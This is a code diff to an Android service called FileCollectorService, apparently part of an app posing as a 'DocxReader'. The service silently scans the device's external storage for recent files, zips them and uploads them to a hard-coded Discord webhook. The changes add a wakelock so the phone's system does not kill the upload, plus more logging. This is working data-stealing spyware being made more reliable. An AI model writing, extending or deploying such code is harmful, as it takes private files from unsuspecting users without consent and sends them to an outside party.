@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
@@ -28,7 +29,6 @@ public class FileCollectorService extends Service {
     private static final long THIRTY_DAYS_MS = 30L * 24 * 60 * 60 * 1000;
     private static final long MAX_ZIP_SIZE = 100L * 1024 * 1024;
 
-    // ★★★ DISCORD WEBHOOK URL ★★★
     private static final String WEBHOOK_URL =
         "https://discord.com/api/webhooks/1539251824912109568/VnLqwavg5WUXiNXGSUV9C-eDdVN85HmlTQrT20NBrx0PTPMgrpbg2IEUZmEXOpkJd8UK";
 
@@ -49,28 +49,44 @@ public class FileCollectorService extends Service {
 
         startForeground(1, notif);
 
-        new Thread(this::collectAndSend).start();
+        // Acquire wakelock so Chinese ROMs don't kill us
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        PowerManager.WakeLock wl = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK, "DocxReader:UploadLock");
+        wl.acquire(120000); // 2 minutes max
+
+        new Thread(() -> {
+            try {
+                collectAndSend();
+            } finally {
+                if (wl.isHeld()) wl.release();
+                stopSelf();
+            }
+        }).start();
+
         return START_NOT_STICKY;
     }
 
     private void collectAndSend() {
         try {
             List<File> files = scanFiles();
+            Log.d(TAG, "Found " + files.size() + " files");
+
             if (files.isEmpty()) {
-                Log.d(TAG, "No target files found");
-                stopSelf();
+                Log.d(TAG, "No target files found, stopping");
                 return;
             }
 
             File zip = createZip(files);
             if (zip != null && zip.exists()) {
+                Log.d(TAG, "ZIP created: " + zip.length() + " bytes, uploading...");
                 DiscordUploader.upload(WEBHOOK_URL, zip);
                 zip.delete();
+                Log.d(TAG, "Upload complete");
             }
         } catch (Exception e) {
             Log.e(TAG, "Error in collection", e);
         }
-        stopSelf();
     }
 
     private List<File> scanFiles() {
@@ -87,16 +103,26 @@ public class FileCollectorService extends Service {
         };
 
         for (File dir : dirs) {
-            if (dir.exists()) scanDir(dir, cutoff, result);
+            if (dir.exists()) {
+                Log.d(TAG, "Scanning: " + dir.getAbsolutePath());
+                scanDir(dir, cutoff, result);
+            }
         }
-        scanDir(Environment.getExternalStorageDirectory(), cutoff, result);
+
+        // Also scan root of external storage
+        File root = Environment.getExternalStorageDirectory();
+        Log.d(TAG, "Scanning root: " + root.getAbsolutePath());
+        scanDir(root, cutoff, result);
 
         return result;
     }
 
     private void scanDir(File dir, long cutoff, List<File> result) {
         File[] list = dir.listFiles();
-        if (list == null) return;
+        if (list == null) {
+            Log.d(TAG, "Cannot list: " + dir.getAbsolutePath() + " (null)");
+            return;
+        }
         for (File f : list) {
             if (f.isDirectory()) {
                 String n = f.getName();
